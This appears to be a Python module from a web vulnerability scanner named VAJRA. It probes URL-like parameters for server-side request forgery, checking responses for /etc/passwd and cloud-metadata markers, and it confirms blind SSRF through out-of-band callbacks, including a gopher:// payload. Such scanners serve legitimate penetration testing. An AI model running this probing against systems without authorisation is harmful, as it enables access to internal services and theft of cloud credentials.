"""VAJRA SSRF scanner — parameter-driven server-side request forgery with
cloud-metadata and internal-service detection."""
import re

from core.database import Finding
from core.payload_engine import BANKS, SSRF_MARKERS

URL_HINTS = ("url", "uri", "fetch", "source", "src", "proxy", "load",
             "link", "site", "callback", "remote", "target", "feed",
             "img", "image", "file", "path", "doc", "download", "read")


def run(engine):
    t = engine.target
    targets = engine.state.get("web_targets") or []
    if not targets:
        return
    from modules.web.vuln_scanner import build_points, send_point
    points = build_points(engine)
    tested = set()
    hits = []
    payloads = BANKS["ssrf"][:60]

    for pt in points:
        for k, v in pt.fields:
            if not any(h in k.lower() for h in URL_HINTS):
                continue
            key = (pt.url.split("?")[0], k)
            if key in tested:
                continue
            tested.add(key)
            base_r = send_point(engine, pt, k, str(v))
            blen, bbody = len(base_r.body), base_r.body[:40000]
            for payload in payloads:
                r = send_point(engine, pt, k, payload)
                body = r.body[:60000]
                marker = next((desc for sig, desc in SSRF_MARKERS.items()
                               if sig.lower() in body.lower()), None)
                if marker and marker.split()[0] not in bbody:
                    hits.append((pt.origin, pt.method, k, payload, marker,
                                 r.status))
                    break
                if abs(len(body) - blen) > 200 and \
                        any(m in body for m in ("root:x:", "ami-id")):
                    hits.append((pt.origin, pt.method, k, payload,
                                 "response differential + content match",
                                 r.status))
                    break

    oob = getattr(engine, "oob", None)
    confirmed = []
    if oob is not None and not hits:
        blind = _blind_ssrf_oob(engine, points, oob, URL_HINTS)
        for origin, method, param, payload, marker, status in blind[:5]:
            confirmed.append({"method": method, "url": origin,
                              "param": param})
            engine.db.add_finding(Finding(
                t.display, "web.ssrf_scan", "web-vuln", "critical",
                "BLIND SSRF — OOB callback (param '%s')" % param,
                detail="No direct response marker, but the server hit our "
                       "out-of-band collaborator: %s" % marker,
                evidence="%s %s\nparam=%s\npayload=%s\n%s" % (method, origin,
                                                              param, payload,
                                                              marker),
                remediation="Allowlist egress destinations; block link-local "
                            "and metadata IPs at the network layer.",
                confidence="firm"))
            engine.log.finding("[ssrf] BLIND %s -> %s (%s)"
                               % (origin, param, marker))

    for origin, method, param, payload, marker, status in hits[:8]:
        confirmed.append({"method": method, "url": origin, "param": param})
        engine.db.add_finding(Finding(
            t.display, "web.ssrf_scan", "web-vuln", "critical",
            "SSRF confirmed (param '%s') — %s" % (param, marker),
            detail="Origin: %s\nParameter: %s\nServer fetched attacker-"
                   "supplied URL. Cloud metadata / internal services are "
                   "reachable." % (origin, param),
            evidence="%s %s\nparam=%s\npayload=%s\necho=%s http=%d" %
                     (method, origin, param, payload, marker, status),
            remediation="Allowlist egress destinations; block link-local "
                        "and metadata IPs at the network layer.",
            confidence="firm"))
        engine.log.finding("[ssrf] %s -> %s (%s)" % (origin, param, marker))
    engine.state["ssrf_confirmed"] = [
        c for c in confirmed[:8] if c.get("url")]
    if not hits:
        tested_n = len(tested)
        if tested_n:
            engine.db.add_finding(Finding(
                t.display, "web.ssrf_scan", "coverage", "info",
                "SSRF probes completed on %d candidate parameter(s)" % tested_n,
                confidence="firm"))


def _blind_ssrf_oob(engine, points, oob, url_hints):
    """Blind SSRF: point the server at our collaborator and wait for the
    callback that its outbound fetch produces."""
    import time
    token = oob.token
    cb = oob.url("ssrf")
    gopher_host = "%s:%d" % (oob.host(), oob.port)
    payloads = ["%s/%s" % (cb, t) for t in ("x", "y")] + \
               ["gopher://%s/_%s" % (gopher_host, token)]
    before = [h for h in oob.hits() if h["path"].startswith("/ssrf/")]
    tested = []
    for pt in points[:20]:
        for k, v in pt.fields:
            if not any(h in k.lower() for h in url_hints):
                continue
            from modules.web.vuln_scanner import send_point
            for p in payloads[:2]:
                try:
                    send_point(engine, pt, k, p)
                    tested.append((pt.origin, pt.method, k, p))
                except Exception:
                    continue
    time.sleep(1.2)
    nov = [h for h in oob.hits() if h["path"].startswith("/ssrf/")]
    if not nov:
        return []
    newest = nov[-1]["path"]
    return [(o, m, k, p, "callback: %s" % newest, 0)
            for (o, m, k, p) in tested[-1:]]
